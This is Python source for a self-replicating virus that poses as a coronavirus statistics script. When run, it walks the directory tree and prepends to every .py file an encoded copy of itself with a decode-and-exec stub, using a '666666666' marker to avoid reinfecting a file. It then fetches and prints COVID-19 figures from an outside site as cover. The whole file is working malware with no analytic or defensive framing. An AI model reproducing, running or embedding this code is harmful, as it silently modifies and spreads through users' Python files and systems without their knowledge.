666666666


import os
import random
import fnmatch
import string

os.chdir(os.path.dirname(os.path.abspath(__file__)))
def sxor(s1,s2):
    return ''.join(chr(ord(a) + ord(b)) for a,b in zip(s1,s2))


def random_string(stringLength):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(stringLength))



def get_infection():
    key=random_string(size)
    encrypted = sxor(data, key)
    return encrypted , key


def attach_to_program (path):
    with open(path, "r") as rf:
        originalFile : str = rf.read()
    with open(path, "r") as rf:
        firstLineString : str = rf.readline()
    if ("666666666\n" != firstLineString):
        with open(path, "w") as mf:
            encrypted, key = get_infection()
            child_tail = """def decode(s1,s2):
    return ''.join(chr(ord(a) - ord(b)) for a,b in zip(s1,s2))\ndata=decode(encrypted_string,key)\nexec(data)\npayload()"""
            mf.write("666666666\n# -*- coding: utf-8 -*-\n" + 'encrypted_string="' +encrypted+'"\n'+ 'key="' + key+ '"\nsize='+ str(len(data)) + '\n' +  child_tail +'\n' + '666666666\n'+ originalFile)



def payload():
    for root, dir, files in os.walk("."):
        for file in fnmatch.filter(files, "*.py"):
            attach_to_program(root+ '/' + file)
    import requests
    r = requests.get("https://corona-stats.online/?format=json&minimal=true")
    d = r.json()
    print("CORONAVIRUS STATISTICS")
    for x in d['data']:
    	print("COUNTRY: " + x["country"] + " CASES: "+ str(x["cases"])+ " CASES TODAY: "+ str(x["todayCases"]) + " DEATHS: " + str(x["deaths"]) + " DEATHS TODAY: " + str(x["todayDeaths"]))
    	


666666666
with open(__file__, "r") as rf:
    lines = rf.readlines()
    endIndex = lines.index("666666666\n", 1)
    dataList = lines[1:endIndex]
    data = "".join(dataList)
    size=len(data)
payload()
